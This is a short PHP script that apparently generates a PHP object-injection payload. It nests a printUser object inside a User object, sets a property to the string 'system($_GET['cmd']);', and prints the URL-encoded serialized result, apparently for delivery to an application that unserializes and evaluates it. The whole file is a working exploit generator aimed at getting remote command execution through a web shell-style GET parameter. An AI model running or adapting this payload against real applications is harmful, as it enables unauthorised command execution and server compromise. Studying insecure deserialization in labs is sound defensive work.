<?php
class printUser
{
	public function __construct() {
		$this->hook = 'system($_GET[\'cmd\']);';
	}
}

class User
{
	public function __construct() {
		$this->user = new printUser();
	}
}
$obj = new User;
$obj = urlencode(serialize($obj))."\n";
echo $obj;